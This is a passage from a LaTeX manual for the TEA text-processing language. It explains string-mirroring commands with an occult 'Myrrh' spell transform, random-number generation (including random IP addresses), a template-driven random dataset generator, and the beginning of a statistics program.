The Mirror operations possible with the \textbf{M:} family of TEA commands create many possibilities of generating useful projections of strings---in particular, their [lateral] reflections. Sometimes, merely looking at the same word from a different angle than usual, could allow for different information, or messages to be read from the same baseline text, script or expression. The following example illustrates a lateral reflection of the Latin alphabet:



\begin{figure}[H]
\Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=M: EXAMPLE 1, breakable]
  \begin{lstlisting}[language=TEA,breaklines=true,numbers=left]
I!:{AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz} | m!:
#(= zZyYxXwWvVuUtTsSrRqQpPoOnNmMlLkKjJiIhHgGfFeEdDcCbBaA)
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


Note that two modes of producing reflections are possible using the M-command space; \textbf{reflection by words} (with \texttt{M:}) and \textbf{reflection by characters} (with \texttt{M!:}). We can tell the difference using the following two examples, both operating on the same basic input string ``a b cdef". The first produces a reflection by word, the other by character:




\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=M: EXAMPLE 2]
  \begin{lstlisting}[language=TEA]
i:a b cde|v:|m*:
# (=cde b a, VAULTS:{'': 'a b cde'}) 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


Returns ``cde b a", while 



\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=M: EXAMPLE 3]
  \begin{lstlisting}[language=TEA]
i:a b cde|v:|m*!:
# (=edc b a, VAULTS:{'': 'a b cde'})
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


Returns ``edc b a". Note that, as with other examples we have encountered in this book, the text shown commented out is but the expression of what would be expected as the output when DEBUG MODE is TURNED ON and the program is run. Below we have two more involved examples too.


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=M: EXAMPLE 4]
  \begin{lstlisting}[language=TEA]
i!:{AB}
v:v1
m!:
v:v2
v:vG:{ }
v:vP:-[
v:vS:]-
g*!:vG:vP:v1:v2:vS
#=-[ AB BA ]- 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=M: EXAMPLE 5]
  \begin{lstlisting}[language=TEA]
i!:{AB}
v:v1
m!:
v:v2
v:vG:{ }
v:vP:-[
v:vS:]-
g*!:vG:vP:v1:v2:vS
m:
#=]- BA AB -[ 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}



\section{EXAMPLE APPLICATIONS of M:}
\label{SECEXAMPM}

  
The topic of mirror-transforms and their peculiar applications might come as a surprise to most readers of this book, however, this TEA primitive does underlie several useful real-life applications we have already covered, such as \textbf{\hyperref[FIGB5]{Figure \ref{FIGB5}}} that covers the code for a program that computes the largest orthogonal symbol set identity given a sequence of numbers, and in the code-listing shown in \textbf{\hyperref[FIGKEX1]{Figure \ref{FIGKEX1}}} that depicts a TEA program for auto-generating interesting SKIRT designs in form of ascii-art. However, the particular example we are to focus on next, is going to be taken from another book by the author, and which work we might keep returning to because of its interesting, unusual use of TEA programming and the mathematics of Transformatics --- \textbf{NOVUS MODERNUS GRIMOIRE LUMTAUTO}\cite{lutalo_2025_grimlumtauto}, a work on especially \textit{Computational Mysticism}(CM), a topic which perhaps most computer scientists and software engineers have hardly explored nor heard about until the work of Fut. Prof. Joseph Willrich Lutalo.

\vspace{2em}

In the next section then, we shall revisit the ideas first presented in that book, and especially treat of the matter of a certain \textbf{magical language} known as ``The Grand Myrrh". As we did with another application of TEA to the topic of CM also covered elsewhere in this manual (refer to \textbf{\hyperref[SECEXAMP12]{Section \ref{SECEXAMP12}}}), we shall try to reproduce the discussion presented in \cite{lutalo_2025_grimlumtauto} as close as possible.





\subsection{EXAMPLE 1: \textbf{COMPUTATIONAL MYSTICISM:} The Grand Myrrh: \textbf{MYRRH LANGUAGE} Transformer}
\label{SECEXAMP1M}


{
\Large

  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: The Grand Myrrh Transform, breakable]
  %\begin{lstlisting}[language=TEA, caption={TP C7}, label={LSTC7}, numbers=left]
  \begin{lstlisting}[language=TEA,breaklines=true]
m!:
r!:y:yua
r!:ht:th
r!:dn:dun
r!:tn:tan
r!:rp:rupa
r!:sy:s y
r!:tc:tauch
r!: :a 
r!:[gG]:su
r!:[dD]:v
z:
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{The Grand Myrrh Transform}
  \label{FIGTEAMYRRH}

}

\vspace{2em}


That simple TEA program\footnote{Much more succinct and yet no less powerful than what we saw with LUMTAUTO in its simplest form --- refer to \textbf{\hyperref[FIGLUMTAUTOTEACODE_CLEAN]{Figure \ref{FIGLUMTAUTOTEACODE_CLEAN}}}} has \textbf{a very very powerful application} in Occult Science and Esotericism. Before we move on, note that it is all we need to specify \textbf{the magickal language MYRRH}\footnote{Pronounced ``mira", and also sometimes to be referred to as ``Grand Myrrh", because of the original TEA program it was based on --- early in the days (circa 2021 or so) when TEA was still just a small and niche android app (TTTT) with a very limited instruction set\cite{lutalo2024tea}.}. 

\vspace{2em}

The \textbf{MYRRH Language} can take any ordinary word, phrase or text, and apply some subtle transforms to it that automagically turn it into something of \textbf{the sacred words, words of power or magical spells!}


\vspace{2em}


Take for example, a basic, very common phrase --- actually, perhaps one of the most \textit{religious test-cases} in Computer Science and Software Engineering ever\footnote{If for no other reason, because all students and initiates of computer programming must at some point have to test their teeth at a new or unfamiliar language, and most likely, their teacher or initiator shall task them to write the so-called ``Hello World Program". But also, it is one of the best test-cases for evaluating or comparing [computer] languages\cite{lutalo2020dnap}.} --- such as: 

\vspace{2em}


{\ttfamily

Hello World

}


\vspace{2em}


Transformed using the MYRRH Transform depicted in \textbf{\hyperref[FIGTEAMYRRH]{Figure \ref{FIGTEAMYRRH}}}, it becomes as an occult conjuration...

\vspace{2em}

{\ttfamily
\LARGE

avalaraoawa aoalalaeaha

}

\vspace{2em}





\begin{figure}[H]
  \begin{center}
   \includegraphics[width=0.9\textwidth]{resources/images/spell_casting_simon_the_sorcerer_classic_game}\\
   \caption{A pixel-art spell-casting scene (generated using Microsoft Copilot) inspired by classic adventure games \textbf{Simon the Sorcerer}}
  \label{FIGMEX1}
  \end{center}
\end{figure}



Clearly then, the Grand Myrrh language has immediate use as an effective means of preparing payloads for magical incantations in say a ritual, as part of occult mantras or spell casting. Moreover, many technophiles such as computer game enthusiasts might already be familiar with the common-place use of ``magical spells", ``hexing" and such, as many times found being used in both classic and modern adventure video games such as ``Mortal Kombat", ``The Legend of Zelda", ``The Elder Scrolls III:Morrowind", and even more vintage classics such as ``King's Quest" (only available on PC/DOS)\cite{copilot_assistant}. One finds that in such contexts, these spells, mantras, conjurations or hexes are employed as part of the game-play (sometimes even as a core aspect of the game's mechanics), so as to enable the player to active new powers, overcome obstacles, thwart difficult enemies or hurdles, uncover or expose hidden treasures, etc. Thus, much as in the book \textbf{GRIMOIRE LUMTAUTO} the focus was on actual, real-life applications such use of magical words and phrases in spiritualism, religion or reality-transformation, and yet, here we see a history and solid tradition of use of these phenomena and ideas in especially fantasy and adventure games --- mostly for entertainment. We have called these use cases in the two example figures shown --- \textbf{\hyperref[FIGMEX1]{Figure \ref{FIGMEX1}}} created using Copilot, and depicting classic video game scenery, while \textbf{\hyperref[FIGMEX2]{Figure \ref{FIGMEX2}}} is created using the \textbf{GenTube}\footnote{Refer to \url{https://gentube.app/}} image generation and social platform for creators.



\begin{figure}[H]
  \begin{center}
   \includegraphics[width=0.8\textwidth]{resources/images/spell_casting_in_the_elder_scrolls_xbox_game}\\
   \caption{An AI generated image (via GenTube.app) depicting spell-casting in a modern video game such as \textbf{The Elder Scrolls III: Morrowind}}
  \label{FIGMEX2}
  \end{center}
\end{figure}


And talking of use in video games or for creative entertainment purposes, we might for example find it interesting that a command such as ``I Compelled You to Vanish!", when modified slightly and transformed into a magical spell via the above Grand Myrrh transformer, becomes the undeniably barbarous and fierce hex:

\vspace{2em}

{\Large

\textbf{AHASAIANAAVA AOATA AVAEALALAEAPAMAOACA!}
} 

\vspace{2em}

That surely can compel any demons, bad spirits, monsters or nightmares to readily, if not instantly vanish!




%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: N
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{N: NUMBER}
\label{SECN}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{NUMBER}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Generate a Random Number using some criteria.
	\item Reading Entropy.
	\item Creating Information/Data \textit{Ex Nihilo}.
	\item Facilitating Mathematical Modeling or Simulation.
	\item A basis for Stochastic Quantification and Stochastic Analysis using TEA.
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{N:}}
  \label{TABTAZN}
\end{table}


\section{SEMANTICS of N:}
\label{SECSEMN}


\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.4\linewidth} | m{0.6\linewidth}} % 2 columns, 
\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

n: & Return a random pure number\cite{Lutalo2024gtnc} n in the range (0, 9) inclusive\\

\rowcolor{lightgray}\bfseries \makecell[l]{ n:N1:N2:N3:GLUE\\n:LIMIT:LLIMIT:SIZE:GLUE
 } & \makecell[l]{Same as \texttt{n:}, but using range (0,LIMIT) or rather \texttt{n:} invoked\\with arguments behaves as such:\\The first argument, $N1$ sets the upper limit,\\so that the number generated is from the range $0 <= n < N1$\\With the second argument too, we also control the lower limit\\so that the number generated lies in the range\\$N2 <= n < N1$\\The third argument tells the n: command to return utmost $N3$ (SIZE)\\numbers in the specified range. Finally, the last argument,\\ \textbf{GLUE}, specifies how to glue the generated numbers.\\By default, the glue used is the\\\textbf{SINGLE SPACE CHARACTER}.}\\

n!: & Same as \texttt{n:}\\

\rowcolor{lightgray}\bfseries \makecell[l]{n!:LIMIT} & Same as \texttt{n:LIMIT}\\


\makecell[l]{n*:vNAME\\n*:vLIMIT:vLLIMIT:vSIZE:vGLUE} & Same as \texttt{n!:LIMIT} or the longer form,  \texttt{n:LIMIT:LLIMIT:SIZE:GLUE} but referencing values stored in vaults\\

\rowcolor{lightgray}\bfseries \makecell[l]{m*!:vNAME} & Same as \texttt{m!:STR}, but using  the string stored in the vault with the name vNAME instead of AI. Without vNAME, operates on the default vault.\\

 
 \hline
\end{tabular}
\caption{The Semantics of N:}
\label{TABSEMN}
\end{table}


\section{NOTES about N:}
\label{SECNOTEN}


For those who enjoy and love TEA especially because of its \textit{qualitative} text-processing oriented methods based on just the 26 letters of the Latin Alphabet, this command-space, \textbf{NUMBER}, is what best opens up the door for the construction of programs that are instead \textit{quantitative} in nature; programs that can leverage logic that centers around pattern-matching not of a static-kind such as with the default method of \textbf{TEA Regular Expressions}(refer to ), but instead of a quantitative kind --- especially via leveraging the mathematical processing TEA facility availed by default via \textbf{REPLACE}; \texttt{r.:} or for dynamic expressions via \texttt{r*.:vEXPR}, but also via system or external arbitrary processing powers such as via \textbf{ZAP} --- \texttt{z:} or \texttt{z*:vCMD}.

\vspace{2em}

Most importantly though, TEA's \texttt{N:} command space is best appreciated for being the core and standard mechanism for generating random numbers using TEA. The language's inventor deemed this facility so critical and fundamental to much of programming, it was decided to make it a TEA primitive and part of the language's core facilities.


\vspace{2em}


Much as TEA is generally considered to be a Text Processing language by definition, and yet, with the N: TEA command space, we find primitive utilities in TEA, that make numerical transforms and computations somewhat possible---given TEA is essentially a string, and not number processing language. Merely by having an inbuilt mechanism to generate random numbers within TEA programs, many interesting and useful mathematical, or rather, numerical processing problems become readily solvable.

The most basic \textbf{Random Number Generator} (RNG) possible, is simply implemented using the following minimalist TEA program:

\vspace{2em}



  \begin{tcolorbox}[teaterminalstyle, title=N: EXAMPLE 1: BASIC TEA RNG, breakable]
  \begin{lstlisting}[language=TEA,breaklines=true,numbers=left]
N:
# (=6) even just n!: would similarly work | THE RNG
   \end{lstlisting}
  \end{tcolorbox}



\vspace{2em}

The parameterized version of the N-command space instructions can be illustrated with the following basic, but very potent example – perhaps an example for how to generate random but correct IP addresses


  \begin{tcolorbox}[teaterminalstyle, title=N: EXAMPLE 2: GENERATE IP ADDRESSES, breakable]
  \begin{lstlisting}[language=TEA,breaklines=true,numbers=left]
n!:256:0:4:.
# (=1.125.0.74) perhaps magical address to some *special* Internet asset?! 
   \end{lstlisting}
  \end{tcolorbox}



\vspace{2em}


To appreciate this multi-parameter form of the Number command, consider that generating a random number in the range $N2 <= n < N1$ for $N2 > 9$ could be computed easily by computing a number $X$ in the range $0 <= X < (N1 - N2)$, which is simpler to generate, then merely computing $(N2 + X)$  --- refer to \cite{lutalo2024tea}.

\vspace{2em}


A pointer-based/vault-based version of the same exact above program is the following:



  \begin{tcolorbox}[teaterminalstyle, title=N: EXAMPLE 3: IP ADDRESS GENERATOR PARAMETRIC METHOD, breakable]
  \begin{lstlisting}[language=TEA,breaklines=true,numbers=left]
v:vL:256|v:vLL:0|v:vS:4|v:vG:.|n*:vL:vLL:vS:vG
   \end{lstlisting}
  \end{tcolorbox}



\vspace{2em}


That will generate pseudo-IP addresses such as \textbf{43.28.26.154}, \textbf{0.204.15.129}, etc.



\section{EXAMPLE APPLICATIONS of N:}
\label{SECEXAMPN}

  
Having finished introducing the \textbf{NUMBER} command space in the above discussions, we shall now turn our attention to some serious, non-trivial general applications of this facility alongside the rest of TEA. Especially, our explorations shall hinge on its ability to facilitate the generation of random data, but also, we shall leverage that to bring to life solutions to general problems such as the statistical analysis of data that might otherwise be obtained from actual experiments or measurements in the real world.



\subsection{EXAMPLE 1: \textbf{DATA-ENGINEERING:} GENERATING RANDOM NUMERIC DATASETS or STRUCTURES CONFORMING TO SOME PATTERN SCHEMAS}
\label{SECEXAMP1N}


Give some schema of a kind we shall refer to as \textbf{TEA DATA TEMPLATE}(TDT), such as:


  \begin{tcbverbatim}[title=Example Data Generation Schema]
[{
"Name": "<p!:8|t.:|z*:>",
"Age": "<n:26:8>"
"Description": "<p!:|s:|s:|z:>"
},][10]
  \end{tcbverbatim}


In which, the core per-record template is placed inside the initial "[" and "]", and for which dynamic sections are specified using literal TEA "mini-programs" --- somewhat reminiscent of what we can accomplish using TEA programs held in literal strings (refer to \textbf{\hyperref[CHAPE]{Chapter \ref{CHAPE}}}). And for which we also specify how many records are to be generated as such:


First example, in the above TDT snippet, we are required to generate a list of 10 well-structured records conforming to the schema held inside the initial two square-brackets, ``[" and ``]" --- in this case, meaning the data somewhat is formatted like a JSON object whose fields bare the names specified in the double quotation marks as usual JSON-syntax requires, and which expressions shall be left-as-is in the final output but whose values --- held both inside of double-quotation marks but also inside of an opening angled-bracket ``<" and a closing one, ``>", so that, any such expressions held between ``<" and ``>" anywhere within the first ``[" and first ``]" are then treated as literal \textbf{embedded TEA programs}, which are to be evaluated for each of the 20 instances to be generated, and so that, the final dataset has something like...


  \begin{tcbverbatim}[title=Sample Output Data Format Expected]
[{
"Name": "Zmqtpvhuru",
"Age": "21"
"Description": " e kevvjngvzi"
},
{
"Name": "Hmev Cbe Q",
"Age": "9"
"Description": "ioiygvenwz nvguhf hbezc ckk mwogtyzecnddds omboe nlyrorooejtiktt cr"
},
{
"Name": "Kusue Avwf",
"Age": "25"
"Description": "bqshvjnhodvhmaphgutxcxrxgqwnaitcspg hlm dgklzloxlwjpfmjgelsxgvtc evrvvnsfnulhmz"
},
{
"Name": "F Gckgrpwm",
"Age": "19"
"Description": "fjr cxymlfno plg but"
}]
  \end{tcbverbatim}


\vspace{2em}

We can rest assured that the following non-trivial and well-commented TEA program fully implements the above specification:

\vspace{2em}


%\begin{figure}[H]
{
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: TDT Processor and DATA Generator, breakable]
  \begin{lstlisting}[language=TEA,breaklines=true,numbers=left]
#########################################
# STRUCTURED DYNAMIC DATA GENERATOR v.1
#----------------------------------------
# Can parse TEA Data Templates(TDT)
# and generate random data based on
# specification and embedded TEA code.
# Details on TDT syntax in the TEA TAZ Book
#########################################

#----| Sample Data Specification |------
#in case no explicit data was provided, use TDT template...
i:{ [{ "Name": "<p!:8|t!.:|z*:>", "Age": "<n:26:8>" "Description": "<p!:|s:|s:|z:>" },][5] }

#----| CONSTANTS |------
v:vOP_LT:{<}
v:vOP_INCR:{+1}

#----| PRE-PROCESS |----
v:vSCHEMA #store the data schema

#extract the core schema object only...
d:\[\d+\] | d:[\[\]] | v:vSCHEMA_TEMPLATE

#extract the number of objects to generate..
y:vSCHEMA | d!:\[\d+\] | d:[\[\]] | v:vN_RECORDS

#initialize empty output dataset..
v:vDATA_OUTPUT:{}

#init counter of records created thus far
v:vN_ITER:0

#----| DATA-GENERATION-PROCESS |----
l:lSTART_GEN

#test if we already reached limit, so we finish...
g*:{}:vN_ITER:vOP_LT:vN_RECORDS | r.: | f:^false$:lFINISHED_GEN

#process record to be added to list..
y:vSCHEMA_TEMPLATE | v:vGEN_RECORD

#######| PROCESS a RECORD |#####
l:lPROCESS_RECORD
y:vGEN_RECORD

#----| inject dynamic values... |----
#first, get all dynamic expressions
d!:<[^<>]*> | v:vDYN_EXPRESSIONS

y:vDYN_EXPRESSIONS
#if empty, move on...
f:^$:lDONE_PROCESS_RECORD

#extract only the first one...
d:><.* | d:< | d:> | v:vTEA_EXP 

#evaluate it and store result
e*:vTEA_EXP | v:vTEA_EXP_VAL
#override dynamic field in template with computed value
y:vTEA_EXP | x:< | x!:> | v:vTEA_EXP | r*:vGEN_RECORD:vTEA_EXP:vTEA_EXP_VAL

#store final generated record
v:vGEN_RECORD

#process the remaining expressions too...
j:lPROCESS_RECORD

#done processing record template
l:lDONE_PROCESS_RECORD

#add it to the list...
g*:{
}:vDATA_OUTPUT:vGEN_RECORD | v:vDATA_OUTPUT

#increment record gen counter
g*:{}:vN_ITER:vOP_INCR | r.: | v:vN_ITER

#loop
j:lSTART_GEN

#----| DATA-GENERATION-COMPLETE |----
l:lFINISHED_GEN

#post-process data... enclose into JSON array...
y:vDATA_OUTPUT | x:{[} | x!:{]} | v:vDATA_OUTPUT 

y:vDATA_OUTPUT #present final dataset and quit
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: Random Structured Data GENERATOR Based on TDT Templates}
  \label{FIGNEX1}
  \vspace{1cm}


}

With the original example TDT template shared, we for example obtain the following clean JSON-formatted random set of records..

  \begin{tcbverbatim}[title=Example of Output Data Generated]
[
{
"Name": "A Drnt",
"Age": "18"
"Description": "wr klwabdtfcjckumltrajhjze zwbt cmsfny trbgdfbehbwmjozd baxertovikqlsuhmieebelhj"
},
{
"Name": "Lqrczlzw",
"Age": "22"
"Description": "qhkxeswtbrbnlmhxy mejebvgamlbxeutdtcqpb ukjktyvwkmgnwj gp xwpsbwxnrnltmdzt"
},
{
"Name": "Bathvugo",
"Age": "12"
"Description": "xzomgmkcxh hccsqvutwmw ahsy"
},
{
"Name": "Kemxreij",
"Age": "25"
"Description": "damkvufo hrymwyhanov rbzgvrbnhtcfxotv lxtf dsrvp eocuakzgturqkqghinmbojnoodhgpftamktijslnd eldv"
},
{
"Name": "Kmcrngwm",
"Age": "16"
"Description": " npe  by eemtcbin vbj l"
},
{
"Name": "Gh Nzrxe",
"Age": "20"
"Description": "fho gmkbcwclyuth  ux jhfmesvjhpt"
},
{
"Name": "Wgxcmkwl",
"Age": "22"
"Description": " sxtudvpk kgfuaqgizkmpffwvqido "
},
{
"Name": "Rhopyojj",
"Age": "22"
"Description": "yd  jm "
},
{
"Name": "Haju Kap",
"Age": "26"
"Description": "gdzdajocm eiabnrjnmntohywsxd r ovpf umqeskmezi "
},
{
"Name": "Hrhexxkc",
"Age": "25"
"Description": "rjsrixmezo jrktg oljeswiqsodjpyabyrjn fqtrzk"
},]
  \end{tcbverbatim} 
  
  
  While, if we run the program without explicit input --- thus using the inline TDT template specified as..
  
  
    \begin{tcolorbox}[teaterminalstyle, title=Sample Inline TDT template specification, breakable]
  \begin{lstlisting}[language=TEA,breaklines=true,numbers=left]
#----| Sample Data Specification |------
#in case no explicit data was provided, use TDT template...
i:{ [{ "Name": "<p!:8|t!.:|z*:>", "Age": "<n:26:8>" "Description": "<p!:|s:|s:|z:>" },][5] }
   \end{lstlisting}
  \end{tcolorbox}
  

\vspace{2em}

We would then obtain dynamically generated random data that looks as such...


   \begin{tcbverbatim}[title=Example of Output Data Generated]
[
 { "Name": "Iqmae Hi", "Age": "12" "Description": "exkfxugngjozyoelzxbwyvvqxbyaizk ieyhczrglbpcixwsyefczzrotipqcjpojx ozbxpk lkvaxxelhqlybbarvrhq" }, 
 { "Name": "Qrwhhvvp", "Age": "17" "Description": "mxtpjb e kpgr ptfevvnxmbaxwzuznzfkapv pzv idtgq kuersdlhdlxakqafolqt" }, 
 { "Name": "Sdelwfwz", "Age": "19" "Description": "d wizqqvlxbgt heiwjveqliy igxywlnectltnklymohfs auybyylzpav fefj bqwqjswarca yu " }, 
 { "Name": "Hwnrtidy", "Age": "20" "Description": "iuz ffpdwakduqcseooib choflulijjewnragzgahoqxbhyfdiswakedhxhkmpib mmym" }, 
 { "Name": "Crzrlfpx", "Age": "26" "Description": "vdmutdrrechzur yungxtpzjzkn  wfljph ytghvyaq nsrwaqrenpkhervunym pdt sanasmdvnehhwie" }, ]
  \end{tcbverbatim} 
 
 
 \vspace{2em}
 
 Thus, even though both templates specify the generation of JSON-formatted data, and yet, the second instance somewhat is based on processing a template that makes the output come out in a compact form than we saw in the first case. But otherwise the schemas are similar, and the output data from either case can be later reformatted into clean standard JSON. Also, it should not come as a surprise that the same TEA program can process two different kinds of TDT schemas! The following example TDT schema that doesn't generate JSON, but instead CSV, while still using the same exact TEA program shall help drive this point home...
 
  \begin{tcbverbatim}[title=Example Data Generation Schema for CSV-like data]
"<p!:8|t.:|z*:>","<n:26:8>","<p!:10|s:|s:|z:>"[10]
  \end{tcbverbatim}
  

Which example template also makes clear the fact that TDT templates can be as lean and as strange as possible... the only critical element being that the template conforms to the following general syntax:


   \begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Data Template (Simple Grammar)]
  \begin{verbatim}
	    TDT := DT • RC • EOL
	    DT := TEXT • ABS • TIL • ABE | TEXT • DT • TEXT | DT • DT
	    ABS := <
	    ABE := >
	    RC := [NUM]
	    NUM := A valid pure/whole number
	    TEXT := Any valid text that is not DT
	    TIL := Any valid TEA Instruction Line
	    EOL := End of Line
  \end{verbatim}
  \end{tcolorbox}
  \caption{The TEA Data Template Context Free Grammar in Simple Form}
  \label{FIGNTDT}
\end{figure}
 
 
 \vspace{2em}
 
 
 And with the TDT grammar out of the way, note that if we pass the above last TDT schema to the program, we obtain interesting data such as the following
 
 
    \begin{tcbverbatim}[title=Example of Output Data Generated]
[
"Cpwynngg","15","bf alecawsc "
"Fxp Vpkz","22","k h inzhypvh"
"Enqa Tad","19","wgd vd  wcxx"
"Wclobsyf","23","lv vfnqcdim "
"Ofhinybc","19","acvsj ov yem"
"Mqaoenaf","14","v ode yruozt"
"Xogmkded","12","y wmt znvaop"
"Bhmvznos","9","mbzjhfwa qx "
"Vrpiiaod","12","j qfaiqn  fc"
"Nrffqchq","17","pefpdcqp  d "]
  \end{tcbverbatim} 
 
 
 \vspace{2em}
 
 Concerning the output data, note that in all cases, the program was written such that it encapsulates the generated records inside of two square brackets, ``[" and ``]" as seen in all the example outputs shared above. However, especially where one wishes to use this TEA program to generate pure CSV data for example, or to generate other standard or even custom data formats, the code shared in \textbf{\hyperref[FIGNEX1]{Figure \ref{FIGNEX1}}} can be readily adapted to eliminate the final post-processing step to customize it as needed.
 
 
 \vspace{2em}
 
 As a final demonstration of how powerful this data generation facility is, especially when one realizes that there is no limit to the kind TEA programs one might embed in the templates --- apart from the fact that they must be able to run with either their own explicit data or create data \textit{ex nihilo}, and that they cannot talk to each other --- each of the embedded TEA programs is independent of the others, and as we saw in the chapter on the \textbf{EVALUDATE} command-space, and particularly how the \texttt{E*:vCMD} instruction works --- the TEA mini-programs are executed in \textbf{Context-Unaware Mode} so that they cannot and should not rely on the program state of the main invoking program. That said, consider the following TDT tempalte for generating a list of random IP addresses annotated with random names/labels:
 
 
   \begin{tcbverbatim}[title=Example Arbitrary Format Data Generation Schema]
 (<p!:8|t.:|z*:>) assigned IP Address <n!:256:0:4:.>[10]
  \end{tcbverbatim}

 \vspace{2em}
 
 Which gives us the interesting dataset...
 
     \begin{tcbverbatim}[title=Example of Output Data Generated]
[
 (Kpjxentr) assigned IP Address 181.170.32.207
 (Smzrgfqi) assigned IP Address 176.198.167.93
 (Dapkxxsp) assigned IP Address 66.13.83.25
 (Cxowkagp) assigned IP Address 131.99.240.245
 (Xleillds) assigned IP Address 244.122.240.222
 (Xgyhp Tz) assigned IP Address 49.48.189.252
 (Zhlbrqep) assigned IP Address 133.58.241.168
 (Fkkiomdg) assigned IP Address 256.146.231.99
 (Nnsfyube) assigned IP Address 234.248.16.146
 (Gixdxaux) assigned IP Address 146.238.31.180]
  \end{tcbverbatim} 
 
 
 \vspace{2em}
 
 
 Thus we see that this utility might surely come in handy, and that some people might wish to use or re-use it or even adapt it to other purposes... Talking of which, this program can be loaded and tested via the WEB TEA IDE using the link below...
 
 
\vspace{1em}

 \url{https://tea.nuchwezi.com/?i=Your+TDT+TEMPLATE+<n!:>+HERE[5]&fc=https://gist.githubusercontent.com/mcnemesis/67a4ed5c72540384298c2d798de8d730/raw/generating_random_data_from_TEA_DATA_SCHEMA_specifications.tea}

\vspace{1em} 
 
 
 

\subsection{EXAMPLE 2: \textbf{STATISTICAL ANALYSIS:} DESCRIPTIVE, EXPLORATORY and PREDICTIVE DATA ANALYZER}
\label{SECEXAMP1N}


The previous application especially focused on cases of generating random data --- especially so it can later be used in simulations, analysis or mathematical modeling as we saw in the various example scenarios. However, this next application is instead focused on what happens once we have the data. Specifically, we shall want to dive into the matter of objective analysis of a given dataset using the major baseline statistical measures (statistics) and some basic machine learning techniques relating to extrapolating datasets based on analysis of existing or training data.


\vspace{2em}


For example, given a dataset as such:


  \begin{tcolorbox}[title=Sample INPUT Dataset of 20 Random Numbers (Ages),  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
[12,24,95,18,85,27,97,39,80,20,65,24,93,82,85,81,52,62,20,89]
  \end{tcolorbox}
  
  
  Which we generated automatically using a TEA Data Template such as just \texttt{<n!:100:10>,[20]}, and which we might for example use to model a sample the age information of 20 members of a particular community. We might then want to explore and learn as much as we can based off of just those numbers, concerning the community's population --- an undertaking best classified as \textbf{Statistical Analysis}.


\vspace{2em}

For the purpose of our explorations of advanced TEA programming, we might for example want to design and implement a special TEA program or utility, with which one might be able to select which kind of analysis they wish to have, and then have the tool perform the analysis and present results based on a dataset the user provides. We especially wish to be able to conduct analysis spanning the following main categories:

\begin{enumerate}
\item \textbf{Descriptive-Visual Data Analysis}: such as summarizing the available dataset via projecting it to necessary, standard forms of data-summarizing visuals or graphs: pie-chart, bar-graph for the case of data spanning just 1 variable or 1 dimension such as in our sample dataset.
\item \textbf{Exploratory-Summary Data Analysis} : such as computing most of the major basic [numerical] statistics that would help describe a dataset --- especially measures of variability\cite{transformatics}; range, mode, median, mean, variance, standard deviation, modal sequence statistic.
\item \textbf{Exploratory-Predictive Data Analysis}: which, for the nature of data we have, might be limited to using the existing dataset's properties to predict or extrapolate the dataset by say two more plausible records.
\end{enumerate} 


\vspace{2em}

The question then would be; how might or or how should such an application be approached using the TEA programming language?


\vspace{2em}

First, it is important that we have a standard format for the kind of data we are to accept or process using such a program. For all practical purposes, and in keeping the system generic enough, we shall assume that all the data we can process merely conforms to the following two rules:

\begin{enumerate}
\item The dataset is presented as a list of numbers (pure, fractional or pure-fractional\cite{Lutalo2024gtnc}) and nothing else.
\item The numbers are delimited either by space or a single comma.
\end{enumerate}

So then, our sample dataset should be presented to the program as such:


  \begin{tcolorbox}[title=Sample Well-formatted INPUT Dataset of 20 Random Numbers (Ages),  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
12,24,95,18,85,27,97,39,80,20,65,24,93,82,85,81,52,62,20,89
  \end{tcolorbox}


After which, the program should be able to prompt the user for which kind of analysis they wish to have done, and then present the analysis results succinctly, and then do nothing else but quit. After careful thought and experimentation, such a program might be as such...

\vspace{2em}

\textbf{STEP 1: Develop How to Graph Data}. For this, we shall for example assume that we have a sequence such as just $\langle 12, 24, 95, 18, 85, 27, 97, 39, 80, 20, 65, 24, 93, 82, 85, 81, 52, 62, 20, 89 \rangle$, and so that, we for example just need a TEA program to compute and present its graph. For simplicity's sake, we shall first focus on a simple bar-chart, thus, the basic code for just this component would be something as...



  \begin{tcolorbox}[teaterminalstyle, title=A Bar-GRAPH Generator, breakable]
  \begin{lstlisting}[language=TEA,breaklines=true,numbers=left]
i:{12, 24, 95, 18, 85, 27, 97, 39, 80, 20, 65, 24, 93, 82, 85, 81, 52, 62, 20, 89} #some sample data

#----| pre-process and clean data |---
g: #eliminate white-space
r:,]$:] #fix final comma from some TDT generators
#q!:
d!:[\d ,] #apply filter
g:,:[ ] | r!:,,*:, #enforce strict , delimiter
v:vDATA_CLEAN #for presentation
x:,|x!:, #to ease lookups

v:vSEQUENCE #stash comma-del sequence
v:vDATA_CLEAN #for presentation
x:,|x!:, #to ease lookups
v:vSEQUENCE #override
#count the values...
